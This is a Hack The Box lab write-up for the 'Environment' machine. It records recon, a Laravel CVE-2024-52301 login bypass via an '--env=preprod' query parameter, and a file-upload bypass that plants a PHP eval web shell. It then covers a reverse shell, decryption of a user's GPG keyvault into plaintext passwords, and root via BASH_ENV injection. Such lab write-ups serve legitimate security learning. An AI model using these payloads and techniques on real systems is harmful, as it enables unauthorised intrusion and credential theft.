---
title: 'HTB-Environment'
published: 2025-09-18
draft: false
toc: true
---
**Start 12:00 14-07-2025**

---
```
Scope:
10.10.11.67
```
# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -vvvv -p- -T5 --min-rate=5000 -Pn environment.htb                                                           [0]

Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
80/tcp open  http    syn-ack nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: nginx/1.22.1
|_http-title: Save the Environment | environment.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80/TCP - HTTP

![](attachments/1d8f064b558f5bd7fecec9d98c51793a.png)
 
I then found a `/login` endpoint using `gobuster` which I analysed using `caido`:

### Gobuster

![](attachments/3be636253845a93e4ec7c415fea7fc68.png)

![](attachments/0e79156b3a8da3db6424c309a3c2e235.png)

![](attachments/c9dbfa87df0553f52392a899b9f11222.png)

### CVE-2024-52301

I tried changing some params like `remember` which showed this:

![](attachments/de26661d055555cb6c275cd59ff646b7.png)

So I intercepted the request, modified it and viewed the response in the browser:

![](attachments/91f8090f235d470e05db4def3bad62cc.png)

This part is the most interesting of the bunch:

```php
if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/preprod envs
	$request->session()->regenerate();
	$request->session()->put('user_id', 1);
	return redirect('/management/dashboard');
}
```

![](attachments/af9ae92a5fc5ff41dfb16a994821020f.png)

Scrolling down I find [this article](https://dev.to/saanchitapaul/high-severity-laravel-vulnerability-cve-2024-52301-awareness-and-action-required-15po):

![](attachments/3ca62ad6a02f98acaa6a97e62582b25f.png)

I started looking for a PoC and found [one on GitHub](https://github.com/Nyamort/CVE-2024-52301):

![](attachments/746e0512fc436067004ea73dd9c9c633.png)

I tried it out:

```URL
POST /login?--env=preprod HTTP/1.1
...
_token=C8CT23Tj0n3u2iNB1mfMVKQBQtx9HCRvdRsXYJK4&email=test%40test.com&password=admin&remember=True
```

![](attachments/c777cb9753c4626aefbf0164d35ef40c.png)

It worked!

![](attachments/0d7cba9f8d58af1f5246e48720b93fb6.png)

### File Upload Attack

I started looking around and found a possible **File Upload Attack**:

![](attachments/2392a620baf2c3fd58e6953c7d609b19.png)

![](attachments/9dfd1b8dade33f923a61271779d1d4ba.png)

It was now time to intercept the request and manipulate it:

![](attachments/245231dcb4aadd75ca5cc009dec4101f.png)

![](attachments/a0112eb5cc40206d77e8827a3bc1019e.png)

So I went ahead and modified it as follows:

```bash
Content-Disposition: form-data; name="upload"; filename="webshell.phtml"
Content-Type: image/jpg

GIF89a
<?php eval($_GET["cmd"]);?>
```

![](attachments/e386e2be4424642a3e6138c39d526286.png)

And in the response we can see the url:

![](attachments/bf10a170b1ab5fd508054634b8ed0682.png)

>[!caution]
>This however would upload the file, but would not give us execution, we had to find another way.

```bash
Content-Disposition: form-data; name="upload"; filename="web.php."
Content-Type: image/jpg

GIF89a
<?php eval($_GET["cmd"]);?>
```

![](attachments/a5355022f4c7fd38d224567db7bc7903.png)

Now going over to the uploaded file page, we didn't have full RCE yet:

![](attachments/b49567b286fa258883d108191a08d0e5.png)

However it did execute commands such as `phpinfo();`

![](attachments/d22ad86b6fa9745f173eaad399b5178b.png)

# Foothold
## Shell as www-data

I had to wrap it in the following code to get execution via `php`:

![](attachments/82fb503a5b9dfb5742e23dbe44516f1e.png)

Using this knowledge I wrapped my reverse shell as follows:

![](attachments/2f2f0eaf191df05b9740b37c8650ada1.png)

And finally got a hit on my listener:

![](attachments/98a517edd0f5e739d48ba0c9a639f63c.png)

I then started enumeration of the target:

![](attachments/40fd9eaa12b8b8cd46c62f330f92c0ef.png)

### user.txt

As *www-data* we already have access to *hish*'s `/home` directory, so I can easily get the `user.txt` flag:

![](attachments/cc13bbe412071f19f2b7539538320b68.png)

## gnupg keys

I found some interesting stuff:

![](attachments/e54813401b18059260f58261e6739fa7.png)

This could potentially give me a way to crack the `keyvault.gpg` file, which might hold some creds.

![](attachments/79a50e856bc0aa0460e15bdab914a127.png)

### Decrypting gnupg

We can easily decrypt this using the following techniques:

```bash
cp -r .gnupg/ /tmp/gnupg
chmod -R 700 /tmp/gnupg/
gpg --homedir /tmp/gnupg/ --list-secret-keys
gpg --homedir /tmp/gnupg/ --output /tmp/creds.txt --decrypt backup/keyvault.gpg 
cat /tmp/creds.txt 
```

![](attachments/e4bcc6d08bd78dff218cd76ad25433cd.png)

```
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

![](attachments/607a2a2fd1f04fc2b6f22eb0fc01951f.png)

It indeed still works, let's move laterally.

## Lateral Movement

![](attachments/f60583d97e16299d2c55d3b2291ce7c1.png)

![](attachments/1eae3f6418832d3caf11f07afcb21709.png)

So what can we do with this?

# Privilege Escalation
## BASH_ENV Injection

I can easily exploit it as follows:

![](attachments/7ce94a3ac3eedd1763488e19de39d80f.png)

>[!tldr]
>But why does this work?
>- `/usr/bin/systeminfo` is a **Bash script** (`file /usr/bin/systeminfo` confirmed this).
>- The script is executed via `sudo`, running as root. 
>- When Bash runs a non-interactive shell to execute the script, **it looks for `BASH_ENV` and sources it if set**.
>- You set `BASH_ENV=./root.sh`, where `root.sh` contains `/bin/bash -p`.   
>- So instead of just running the script commands, Bash first runs your root shell.
>- This results in a **root shell spawned before the script output**, effectively escalating privileges.

### root.txt

![](attachments/c671df2cfa0d31b930d56ac63be23f7e.png)

![](attachments/e34714ce835a34f311bd467939388d93.png)

---

**Finished 14:01 14-07-2025**

[^Links]: [[Hack The Box]]

#BASH_ENV #FileUploadAttacks #gnupg 
